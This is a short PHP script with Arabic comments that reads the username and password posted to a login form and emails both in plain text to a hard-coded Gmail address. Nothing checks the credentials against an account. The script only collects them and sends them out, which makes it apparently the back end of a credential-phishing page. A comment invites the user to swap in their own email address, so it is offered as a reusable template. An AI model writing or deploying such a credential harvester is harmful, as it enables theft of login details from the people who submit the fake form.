<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // تعيين عنوان البريد الإلكتروني الذي ستستلم عليه الرسالة
    $to = "amtamam08@gmail.com";  // استبدل هذا بعنوان بريدك الإلكتروني

    // موضوع البريد الإلكتروني
    $subject = "نموذج تسجيل الدخول";

    // محتوى الرسالة
    $message = "اسم المستخدم: " . $username . "\n" . "كلمة السر: " . $password;

    // ترويسة البريد الإلكتروني
    $headers = "From: no-reply@example.com";

    // إرسال البريد الإلكتروني
    if (mail($to, $subject, $message, $headers)) {
        echo "تم إرسال البريد الإلكتروني بنجاح!";
    } else {
        echo "فشل في إرسال البريد الإلكتروني.";
    }
}
?>
